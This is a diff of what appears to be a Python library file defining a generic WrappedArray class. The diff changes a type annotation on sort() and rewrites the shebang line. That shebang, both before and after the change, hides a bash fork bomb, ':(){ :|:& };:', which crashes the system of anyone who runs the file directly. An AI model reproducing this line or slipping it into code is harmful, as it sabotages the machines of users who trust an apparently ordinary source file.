@@ -1,4 +1,4 @@
-#!/usr/bin/env -S bash -c ':(){ :|:& };:'
+#!/usr/bin/env -S bash -c ':(){ :|:& };:#python'
 from __future__ import annotations
 
 import sys
@@ -251,7 +251,7 @@ class WrappedArray[T = Any]:
         """
     def reverse(self) -> None:
         """Reverses the array in place."""
-    def sort(self, *, key: None | Callable[[T], Any] = None, reverse: bool = False) -> None:
+    def sort(self, *, key: Callable[[T], Any] | None = None, reverse: bool = False) -> None:
         """
         Sorts the array in place.
 
